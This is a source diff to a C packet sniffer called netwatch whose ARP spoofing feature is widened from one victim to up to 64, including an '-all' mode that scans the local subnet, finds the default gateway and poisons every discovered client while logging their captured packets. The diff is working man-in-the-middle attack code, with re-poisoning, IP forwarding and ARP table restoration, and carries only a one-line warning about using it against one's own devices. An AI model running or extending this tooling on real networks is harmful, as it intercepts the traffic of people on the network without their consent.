@@ -14,6 +14,8 @@
 #include <net/if.h>
 #include <sys/types.h>
 #include <unistd.h>
+#include <fcntl.h>
+#include <sys/file.h>
 #include <sys/ioctl.h>
 #include <linux/if_arp.h>
 #include <signal.h>
@@ -26,6 +28,8 @@
 #define MAX_DUMP 256
 #define CH_MAX 4096
 #define MAX_HOSTS 256
+#define MAX_SPOOF_TARGETS 64
+#define MAX_SCAN_HOSTS 4096
 
 static struct {
     unsigned char dcid[20];
@@ -56,6 +60,11 @@ struct host_stat{
     time_t last_seen;
 };
 
+struct discovered_host {
+    unsigned char ip[4];
+    unsigned char mac[6];
+};
+
 static struct host_stat hosts[MAX_HOSTS];
 static size_t nhosts;
 
@@ -72,7 +81,8 @@ struct arp_spoof_ctx {
     int active;                    // 1 while spoofing, 0 to stop
 };
 
-static struct arp_spoof_ctx spoof_ctx;
+static struct arp_spoof_ctx spoof_ctx[MAX_SPOOF_TARGETS];
+static size_t spoof_count;
 static volatile sig_atomic_t running = 1;
 
 // ===================== helpers: byte readers =====================
@@ -103,7 +113,8 @@ ssize_t recieve_packet(int sockfd, unsigned char *buf, size_t size){
     ssize_t rec = recvfrom(
         sockfd, buf, size, 0, NULL, NULL 
     );
-    if(rec == -1) {perror("recvfrom");}
+    if (rec == -1 && errno != EAGAIN && errno != EWOULDBLOCK && errno != EINTR)
+        perror("recvfrom");
     return rec;
 }
 // ===================== ARP spoofing =====================
@@ -148,6 +159,28 @@ static int parse_ipv4(const char *s, unsigned char *ip) {
     return 1;
 }
 
+static int get_default_gateway(const char *ifname, unsigned char gateway_ip[4]) {
+    FILE *f = fopen("/proc/net/route", "r");
+    if (!f) { perror("/proc/net/route"); return 0; }
+    char line[256];
+    fgets(line, sizeof line, f);
+    while (fgets(line, sizeof line, f)) {
+        char route_if[IFNAMSIZ];
+        unsigned long dest, gateway;
+        unsigned flags;
+        if (sscanf(line, "%15s %lx %lx %x", route_if, &dest, &gateway, &flags) == 4 &&
+            strcmp(route_if, ifname) == 0 && dest == 0 && (flags & 0x3) == 0x3 && gateway) {
+            uint32_t gw = (uint32_t)gateway;
+            memcpy(gateway_ip, &gw, sizeof gw);
+            fclose(f);
+            return 1;
+        }
+    }
+    fclose(f);
+    fprintf(stderr, "no default gateway found for %s\n", ifname);
+    return 0;
+}
+
 static int arp_resolve(int sockfd, int ifindex,
                        const unsigned char *our_mac, const unsigned char *our_ip,
                        const unsigned char *target_ip, unsigned char *target_mac) {
@@ -176,6 +209,7 @@ static int arp_resolve(int sockfd, int ifindex,
     struct sockaddr_ll addr;
     memset(&addr, 0, sizeof addr);
     addr.sll_family   = AF_PACKET;
+    addr.sll_protocol = htons(ETH_P_ARP);
     addr.sll_ifindex  = ifindex;
     addr.sll_halen    = 6;
     memset(addr.sll_addr, 0xff, 6);
@@ -184,13 +218,18 @@ static int arp_resolve(int sockfd, int ifindex,
         perror("sendto (arp_resolve)"); return 0;
     }
 
-    // Wait for the reply (up to 3 seconds)
+    // A receive timeout ends resolution; don't repeat the full timeout 50 times.
     struct timeval tv = { .tv_sec = 3, .tv_usec = 0 };
     setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof tv);
 
     unsigned char buf[128];
     for (int tries = 0; tries < 50; tries++) {
         ssize_t n = recvfrom(sockfd, buf, sizeof buf, 0, NULL, NULL);
+        if (n < 0) {
+            if (errno == EINTR) continue;
+            if (errno != EAGAIN && errno != EWOULDBLOCK) perror("recvfrom (arp_resolve)");
+            break;
+        }
         if (n < 42) continue;
         // Check: EtherType ARP, opcode reply, sender IP matches target
         if (buf[12] != 0x08 || buf[13] != 0x06) continue;
@@ -204,28 +243,29 @@ static int arp_resolve(int sockfd, int ifindex,
     return 0;
 }
 
-static int discover_hosts(const char *ifname, int ifindex) {
+static int discover_hosts(const char *ifname, int ifindex,
+                          struct discovered_host found[], size_t capacity) {
     unsigned char our_ip[4], our_mac[6];
-    if (!get_own_ip(ifname, our_ip) || !get_own_mac(ifname, our_mac)) return 0;
+    if (!get_own_ip(ifname, our_ip) || !get_own_mac(ifname, our_mac)) return -1;
 
     int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
-    if (fd < 0) { perror("socket (discovery)"); return 0; }
+    if (fd < 0) { perror("socket (discovery)"); return -1; }
     struct sockaddr_ll bind_addr;
     memset(&bind_addr, 0, sizeof bind_addr);
     bind_addr.sll_family = AF_PACKET;
     bind_addr.sll_protocol = htons(ETH_P_ARP);
     bind_addr.sll_ifindex = ifindex;
     if (bind(fd, (struct sockaddr *)&bind_addr, sizeof bind_addr) < 0) {
-        perror("bind (discovery)"); close(fd); return 0;
+        perror("bind (discovery)"); close(fd); return -1;
     }
 
     int ctl = socket(AF_INET, SOCK_DGRAM, 0);
-    if (ctl < 0) { perror("socket (interface config)"); close(fd); return 0; }
+    if (ctl < 0) { perror("socket (interface config)"); close(fd); return -1; }
     struct ifreq ifr;
     memset(&ifr, 0, sizeof ifr);
     snprintf(ifr.ifr_name, IFNAMSIZ, "%s", ifname);
     if (ioctl(ctl, SIOCGIFNETMASK, &ifr) < 0) {
-        perror("ioctl SIOCGIFNETMASK"); close(ctl); close(fd); return 0;
+        perror("ioctl SIOCGIFNETMASK"); close(ctl); close(fd); return -1;
     }
     close(ctl);
 
@@ -237,7 +277,7 @@ static int discover_hosts(const char *ifname, int ifindex) {
     uint32_t broadcast = network | ~host_mask;
     if (broadcast <= network + 1 || broadcast - network > 4097) {
         fprintf(stderr, "local subnet is too large or has no usable hosts for ARP discovery\n");
-        close(fd); return 0;
+        close(fd); return -1;
     }
 
     struct sockaddr_ll addr;
@@ -264,12 +304,13 @@ static int discover_hosts(const char *ifname, int ifindex) {
         memcpy(pkt + 28, our_ip, 4);
         memcpy(pkt + 38, target_ip, 4);
         if (sendto(fd, pkt, sizeof pkt, 0, (struct sockaddr *)&addr, sizeof addr) < 0) {
-            perror("sendto (discovery)"); close(fd); return 0;
+            perror("sendto (discovery)"); close(fd); return -1;
         }
     }
 
     printf("Reachable IPv4 addresses on %s:\n", ifname);
-    unsigned char seen[4096] = {0};
+    unsigned char seen[MAX_SCAN_HOSTS] = {0};
+    size_t count = 0;
     while (1) {
         fd_set ready;
         FD_ZERO(&ready);
@@ -278,7 +319,7 @@ static int discover_hosts(const char *ifname, int ifindex) {
         int result = select(fd + 1, &ready, NULL, NULL, &timeout);
         if (result < 0) {
             if (errno == EINTR) continue;
-            perror("select (discovery)"); close(fd); return 0;
+            perror("select (discovery)"); close(fd); return -1;
         }
         if (result == 0) break;
         unsigned char buf[128];
@@ -291,10 +332,16 @@ static int discover_hosts(const char *ifname, int ifindex) {
         if (sender_host <= network || sender_host >= broadcast || sender_host == host_ip ||
             sender_host - network >= sizeof seen || seen[sender_host - network]) continue;
         seen[sender_host - network] = 1;
+        if (count == capacity) {
+            fprintf(stderr, "too many scan results\n"); close(fd); return -1;
+        }
+        memcpy(found[count].ip, buf + 28, 4);
+        memcpy(found[count].mac, buf + 22, 6);
+        count++;
         printf("%u.%u.%u.%u\n", buf[28], buf[29], buf[30], buf[31]);
     }
     close(fd);
-    return 1;
+    return (int)count;
 }
 
 static int arp_send_reply(int sockfd, int ifindex,
@@ -322,6 +369,7 @@ static int arp_send_reply(int sockfd, int ifindex,
     struct sockaddr_ll addr;
     memset(&addr, 0, sizeof addr);
     addr.sll_family   = AF_PACKET;
+    addr.sll_protocol = htons(ETH_P_ARP);
     addr.sll_ifindex  = ifindex;
     addr.sll_halen    = 6;
     memcpy(addr.sll_addr, dst_mac, 6);
@@ -332,17 +380,21 @@ static int arp_send_reply(int sockfd, int ifindex,
     return 1;
 }
 
-static void arp_restore(struct arp_spoof_ctx *ctx, int ifindex) {
+static void arp_restore_all(struct arp_spoof_ctx *ctxs, size_t count, int ifindex) {
     fprintf(stderr, "\n[arp] restoring ARP tables...\n");
     for (int i = 0; i < 5; i++) {
-        // Tell the target: gateway_ip is at gateway_mac (the truth)
-        arp_send_reply(ctx->sockfd, ifindex,
-                       ctx->gateway_mac, ctx->gateway_ip,
-                       ctx->target_mac,  ctx->target_ip);
-        // Tell the gateway: target_ip is at target_mac (the truth)
-        arp_send_reply(ctx->sockfd, ifindex,
-                       ctx->target_mac,  ctx->target_ip,
-                       ctx->gateway_mac, ctx->gateway_ip);
+        for (size_t j = 0; j < count; j++) {
+            struct arp_spoof_ctx *ctx = &ctxs[j];
+            if (!ctx->active) continue;
+            // Tell the target: gateway_ip is at gateway_mac (the truth)
+            arp_send_reply(ctx->sockfd, ifindex,
+                           ctx->gateway_mac, ctx->gateway_ip,
+                           ctx->target_mac,  ctx->target_ip);
+            // Tell the gateway: target_ip is at target_mac (the truth)
+            arp_send_reply(ctx->sockfd, ifindex,
+                           ctx->target_mac,  ctx->target_ip,
+                           ctx->gateway_mac, ctx->gateway_ip);
+        }
         usleep(500000);   // 0.5 second between bursts
     }
     fprintf(stderr, "[arp] restore done\n");
@@ -359,21 +411,24 @@ static void arp_spoof_tick(struct arp_spoof_ctx *ctx, int ifindex) {
                    ctx->gateway_mac, ctx->gateway_ip);
 }
 
-static int enable_ip_forward(void) {
-    FILE *f = fopen("/proc/sys/net/ipv4/ip_forward", "w");
+static int get_ip_forward(int *enabled) {
+    FILE *f = fopen("/proc/sys/net/ipv4/ip_forward", "r");
     if (!f) { perror("ip_forward"); return 0; }
-    fprintf(f, "1\n");
+    int ok = fscanf(f, "%d", enabled) == 1;
     fclose(f);
-    fprintf(stderr, "[arp] IPv4 forwarding enabled\n");
-    return 1;
+    if (!ok) fprintf(stderr, "could not read IPv4 forwarding state\n");
+    return ok;
 }
 
-static void disable_ip_forward(void) {
+static int set_ip_forward(int enabled) {
     FILE *f = fopen("/proc/sys/net/ipv4/ip_forward", "w");
-    if (!f) return;
-    fprintf(f, "0\n");
-    fclose(f);
-    fprintf(stderr, "[arp] IPv4 forwarding disabled\n");
+    if (!f) { perror("ip_forward"); return 0; }
+    int wrote = fprintf(f, "%d\n", enabled) > 0;
+    int closed = fclose(f) == 0;
+    int ok = wrote && closed;
+    if (!ok) { perror("write ip_forward"); return 0; }
+    fprintf(stderr, "[arp] IPv4 forwarding %s\n", enabled ? "enabled" : "disabled");
+    return 1;
 }
 
 static void sigint_handler(int sig) {
@@ -830,18 +885,48 @@ void log_packet(FILE *f, const unsigned char *buf, ssize_t rec){
 int main(int argc, char *argv[]) {
     int do_spoof = 0;
     int do_discover = 0;
-    const char *target_ip_str = NULL;
+    int do_all = 0;
+    const char *target_ip_strs[MAX_SPOOF_TARGETS];
     const char *gateway_ip_str = NULL;
+    char generated_targets[MAX_SPOOF_TARGETS][16];
+    char generated_gateway[16];
+    unsigned char generated_target_macs[MAX_SPOOF_TARGETS][6];
+    unsigned char generated_gateway_mac[6];
+    int have_scanned_gateway_mac = 0;
+    int original_ip_forward = 0;
+    int forwarding_state_saved = 0;
+    int spoof_lock_fd = -1;
 
-    // Simple argument parsing: ./netwatch --spoof <target-ip> <gateway-ip>
     for (int i = 1; i < argc; i++) {
-        if (strcmp(argv[i], "--scan") == 0) {
+        if (strcmp(argv[i], "-all") == 0 || strcmp(argv[i], "--all") == 0) {
+            do_all = 1;
+        } else if (strcmp(argv[i], "--scan") == 0) {
             do_discover = 1;
-        } else if (strcmp(argv[i], "--spoof") == 0 && i + 2 < argc) {
-            target_ip_str  = argv[++i];
+        } else if (strcmp(argv[i], "--spoof") == 0) {
+            if (i + 2 >= argc) {
+                fprintf(stderr, "usage: --spoof <target-ip> <gateway-ip> [target-ip ...]\n");
+                return 1;
+            }
+            if (do_spoof) {
+                fprintf(stderr, "use --spoof once and list all target IPs after the gateway\n");
+                return 1;
+            }
+            target_ip_strs[spoof_count++] = argv[++i];
             gateway_ip_str = argv[++i];
             do_spoof = 1;
+            while (i + 1 < argc && argv[i + 1][0] != '-') {
+                if (spoof_count == MAX_SPOOF_TARGETS) {
+                    fprintf(stderr, "too many targets (maximum %d)\n", MAX_SPOOF_TARGETS);
+                    return 1;
+                }
+                target_ip_strs[spoof_count++] = argv[++i];
+            }
         }
+    }
+
+    if (do_all && (do_discover || do_spoof)) {
+        fprintf(stderr, "-all cannot be combined with --scan or --spoof\n");
+        return 1;
     }
 
     if (do_discover && do_spoof) {
@@ -852,15 +937,103 @@ int main(int argc, char *argv[]) {
     if (do_discover) {
         int ifindex = (int)if_nametoindex(IFNAME);
         if (ifindex == 0) { fprintf(stderr, "unknown interface: %s\n", IFNAME); return 1; }
-        return discover_hosts(IFNAME, ifindex) ? 0 : 1;
+        struct discovered_host found[MAX_SCAN_HOSTS];
+        return discover_hosts(IFNAME, ifindex, found, MAX_SCAN_HOSTS) < 0 ? 1 : 0;
+    }
+
+    if (do_all) {
+        int ifindex = (int)if_nametoindex(IFNAME);
+        unsigned char our_ip[4], gateway_ip[4];
+        struct discovered_host found[MAX_SCAN_HOSTS];
+        if (ifindex == 0) { fprintf(stderr, "unknown interface: %s\n", IFNAME); return 1; }
+        if (!get_own_ip(IFNAME, our_ip) || !get_default_gateway(IFNAME, gateway_ip)) return 1;
+        int found_count = discover_hosts(IFNAME, ifindex, found, MAX_SCAN_HOSTS);
+        if (found_count < 0) return 1;
+        for (int i = 0; i < found_count; i++) {
+            if (memcmp(found[i].ip, our_ip, 4) == 0) continue;
+            if (memcmp(found[i].ip, gateway_ip, 4) == 0) {
+                memcpy(generated_gateway_mac, found[i].mac, 6);
+                have_scanned_gateway_mac = 1;
+                continue;
+            }
+            if (spoof_count == MAX_SPOOF_TARGETS) {
+                fprintf(stderr, "-all found more than %d client targets; refusing to start\n",
+                        MAX_SPOOF_TARGETS);
+                return 1;
+            }
+            snprintf(generated_targets[spoof_count], sizeof generated_targets[spoof_count],
+                     "%u.%u.%u.%u", found[i].ip[0], found[i].ip[1],
+                     found[i].ip[2], found[i].ip[3]);
+            target_ip_strs[spoof_count] = generated_targets[spoof_count];
+            memcpy(generated_target_macs[spoof_count], found[i].mac, 6);
+            spoof_count++;
+        }
+        if (spoof_count == 0) {
+            fprintf(stderr, "no reachable client targets found\n");
+            return 0;
+        }
+        snprintf(generated_gateway, sizeof generated_gateway, "%u.%u.%u.%u",
+                 gateway_ip[0], gateway_ip[1], gateway_ip[2], gateway_ip[3]);
+        gateway_ip_str = generated_gateway;
+        printf("\nTargets to spoof:\n");
+        for (size_t i = 0; i < spoof_count; i++) printf("%s\n", target_ip_strs[i]);
+        fflush(stdout);
+        do_spoof = 1;
+        fprintf(stderr, "[arp] -all selected %zu client target(s); gateway %s excluded\n",
+                spoof_count, gateway_ip_str);
+    }
+
+    if (do_spoof) {
+        unsigned char gateway_ip[4], target_ip[4];
+        if (!parse_ipv4(gateway_ip_str, gateway_ip)) {
+            fprintf(stderr, "bad gateway IP: %s\n", gateway_ip_str); return 1;
+        }
+        for (size_t i = 0; i < spoof_count; i++) {
+            if (!parse_ipv4(target_ip_strs[i], target_ip)) {
+                fprintf(stderr, "bad target IP: %s\n", target_ip_strs[i]); return 1;
+            }
+            if (memcmp(target_ip, gateway_ip, sizeof target_ip) == 0) {
+                fprintf(stderr, "target IP cannot be the gateway IP\n"); return 1;
+            }
+            for (size_t j = 0; j < i; j++) {
+                unsigned char previous_ip[4];
+                if (!parse_ipv4(target_ip_strs[j], previous_ip)) return 1;
+                if (memcmp(target_ip, previous_ip, sizeof target_ip) == 0) {
+                    fprintf(stderr, "duplicate target IP: %s\n", target_ip_strs[i]); return 1;
+                }
+            }
+        }
+    }
+
+    if (do_spoof) {
+        spoof_lock_fd = open("/run/lock/netwatch-spoof.lock", O_CREAT | O_RDWR, 0600);
+        if (spoof_lock_fd < 0) {
+            perror("open spoof lock");
+            return 1;
+        }
+        if (flock(spoof_lock_fd, LOCK_EX | LOCK_NB) < 0) {
+            fprintf(stderr, "another netwatch spoof process is already running\n");
+            close(spoof_lock_fd);
+            return 1;
+        }
     }
 
     signal(SIGINT, sigint_handler);
 
     int sockfd = open_raw_socket(IFNAME);
     if (sockfd == -1) return 1;
+    if (do_spoof) {
+        struct timeval receive_timeout = { .tv_sec = 1, .tv_usec = 0 };
+        if (setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO,
+                       &receive_timeout, sizeof receive_timeout) < 0) {
+            perror("setsockopt (capture timeout)"); close(sockfd); return 1;
+        }
+    }
 
     int ifindex = (int)if_nametoindex(IFNAME);
+    FILE *logfile = fopen("netwatch.log", "w");
+    if (!logfile) { perror("fopen"); close(sockfd); return 1; }
+    setvbuf(logfile, NULL, _IOLBF, 0);
 
     // --- ARP spoof setup ---
     int arp_sockfd = -1;
@@ -871,90 +1044,95 @@ int main(int argc, char *argv[]) {
             "against YOUR OWN devices.\n"
             "===============\n\n");
 
-        if (!parse_ipv4(target_ip_str, spoof_ctx.target_ip)) {
-            fprintf(stderr, "bad target IP: %s\n", target_ip_str); return 1;
-        }
-        if (!parse_ipv4(gateway_ip_str, spoof_ctx.gateway_ip)) {
-            fprintf(stderr, "bad gateway IP: %s\n", gateway_ip_str); return 1;
-        }
-        if (!get_own_mac(IFNAME, spoof_ctx.our_mac)) return 1;
-        if (!get_own_ip(IFNAME, spoof_ctx.our_ip))   return 1;
+        unsigned char our_mac[6], our_ip[4], gateway_ip[4], gateway_mac[6];
+        if (!parse_ipv4(gateway_ip_str, gateway_ip) ||
+            !get_own_mac(IFNAME, our_mac) || !get_own_ip(IFNAME, our_ip)) return 1;
 
         fprintf(stderr, "[arp] our MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
-                spoof_ctx.our_mac[0], spoof_ctx.our_mac[1], spoof_ctx.our_mac[2],
-                spoof_ctx.our_mac[3], spoof_ctx.our_mac[4], spoof_ctx.our_mac[5]);
+                our_mac[0], our_mac[1], our_mac[2], our_mac[3], our_mac[4], our_mac[5]);
         fprintf(stderr, "[arp] our IP:  %u.%u.%u.%u\n",
-                spoof_ctx.our_ip[0], spoof_ctx.our_ip[1],
-                spoof_ctx.our_ip[2], spoof_ctx.our_ip[3]);
+                our_ip[0], our_ip[1], our_ip[2], our_ip[3]);
 
         // Open a separate socket for ARP send/recv
         arp_sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
         if (arp_sockfd < 0) { perror("socket (ARP)"); return 1; }
-        spoof_ctx.sockfd = arp_sockfd;
 
         // Resolve the gateway's real MAC
         fprintf(stderr, "[arp] resolving gateway %s ...\n", gateway_ip_str);
-        if (!arp_resolve(arp_sockfd, ifindex, spoof_ctx.our_mac,
-                         spoof_ctx.our_ip, spoof_ctx.gateway_ip,
-                         spoof_ctx.gateway_mac)) {
+        if (do_all && have_scanned_gateway_mac) {
+            memcpy(gateway_mac, generated_gateway_mac, sizeof gateway_mac);
+        } else if (!arp_resolve(arp_sockfd, ifindex, our_mac, our_ip,
+                                gateway_ip, gateway_mac)) {
             fprintf(stderr, "could not resolve gateway MAC\n"); return 1;
         }
         fprintf(stderr, "[arp] gateway MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
-                spoof_ctx.gateway_mac[0], spoof_ctx.gateway_mac[1],
-                spoof_ctx.gateway_mac[2], spoof_ctx.gateway_mac[3],
-                spoof_ctx.gateway_mac[4], spoof_ctx.gateway_mac[5]);
+                gateway_mac[0], gateway_mac[1], gateway_mac[2],
+                gateway_mac[3], gateway_mac[4], gateway_mac[5]);
 
-        // Resolve the target's real MAC
-        fprintf(stderr, "[arp] resolving target %s ...\n", target_ip_str);
-        if (!arp_resolve(arp_sockfd, ifindex, spoof_ctx.our_mac,
-                         spoof_ctx.our_ip, spoof_ctx.target_ip,
-                         spoof_ctx.target_mac)) {
-            fprintf(stderr, "could not resolve target MAC\n"); return 1;
+        for (size_t i = 0; i < spoof_count; i++) {
+            struct arp_spoof_ctx *ctx = &spoof_ctx[i];
+            ctx->sockfd = arp_sockfd;
+            memcpy(ctx->our_mac, our_mac, sizeof our_mac);
+            memcpy(ctx->our_ip, our_ip, sizeof our_ip);
+            memcpy(ctx->gateway_ip, gateway_ip, sizeof gateway_ip);
+            memcpy(ctx->gateway_mac, gateway_mac, sizeof gateway_mac);
+            if (!parse_ipv4(target_ip_strs[i], ctx->target_ip)) return 1;
+            if (do_all) {
+                memcpy(ctx->target_mac, generated_target_macs[i], sizeof ctx->target_mac);
+            } else {
+                fprintf(stderr, "[arp] resolving target %s ...\n", target_ip_strs[i]);
+                if (!arp_resolve(arp_sockfd, ifindex, our_mac, our_ip,
+                                 ctx->target_ip, ctx->target_mac)) {
+                    fprintf(stderr, "could not resolve target %s\n", target_ip_strs[i]); return 1;
+                }
+            }
+            fprintf(stderr, "[arp] target %s MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
+                    target_ip_strs[i], ctx->target_mac[0], ctx->target_mac[1],
+                    ctx->target_mac[2], ctx->target_mac[3], ctx->target_mac[4],
+                    ctx->target_mac[5]);
         }
-        fprintf(stderr, "[arp] target MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
-                spoof_ctx.target_mac[0], spoof_ctx.target_mac[1],
-                spoof_ctx.target_mac[2], spoof_ctx.target_mac[3],
-                spoof_ctx.target_mac[4], spoof_ctx.target_mac[5]);
 
         // Enable IP forwarding so we don't black-hole traffic
-        if (!enable_ip_forward()) return 1;
+        if (!get_ip_forward(&original_ip_forward)) return 1;
+        forwarding_state_saved = 1;
+        if (!original_ip_forward && !set_ip_forward(1)) return 1;
 
-        spoof_ctx.active = 1;
-        fprintf(stderr, "[arp] spoofing started — press Ctrl+C to stop and restore\n\n");
+        for (size_t i = 0; i < spoof_count; i++) spoof_ctx[i].active = 1;
+        for (size_t i = 0; i < spoof_count; i++) arp_spoof_tick(&spoof_ctx[i], ifindex);
+        fprintf(stderr, "[arp] spoofing %zu target(s) — press Ctrl+C to stop and restore\n\n",
+                spoof_count);
     }
-
-    FILE *logfile = fopen("netwatch.log", "w");
-    if (!logfile) { perror("fopen"); return 1; }
-    setvbuf(logfile, NULL, _IOLBF, 0);
 
     unsigned char buffer[65535];
     time_t last_print = time(NULL);
-    time_t last_spoof = 0;
+    time_t last_spoof = time(NULL);
 
     while (running) {
         ssize_t rec = recieve_packet(sockfd, buffer, sizeof(buffer));
-        if (rec == -1) continue;
-        log_packet(logfile, buffer, rec);
+        if (rec < 0 && errno != EAGAIN && errno != EWOULDBLOCK && errno != EINTR) continue;
+        if (rec > 0) log_packet(logfile, buffer, rec);
 
         time_t now = time(NULL);
         if (now - last_print > 10) { stats_print(stdout); last_print = now; }
 
         // Re-poison every 2 seconds
-        if (do_spoof && spoof_ctx.active && now - last_spoof >= 2) {
-            arp_spoof_tick(&spoof_ctx, ifindex);
+        if (do_spoof && now - last_spoof >= 2) {
+            for (size_t i = 0; i < spoof_count; i++)
+                arp_spoof_tick(&spoof_ctx[i], ifindex);
             last_spoof = now;
         }
     }
 
     // --- Cleanup ---
-    if (do_spoof && spoof_ctx.active) {
-        arp_restore(&spoof_ctx, ifindex);
-        disable_ip_forward();
+    if (do_spoof) {
+        arp_restore_all(spoof_ctx, spoof_count, ifindex);
+        if (forwarding_state_saved && !original_ip_forward) set_ip_forward(0);
         close(arp_sockfd);
     }
 
     fclose(logfile);
     close(sockfd);
+    if (spoof_lock_fd >= 0) close(spoof_lock_fd);
     fprintf(stderr, "[netwatch] clean shutdown\n");
     return 0;
 }
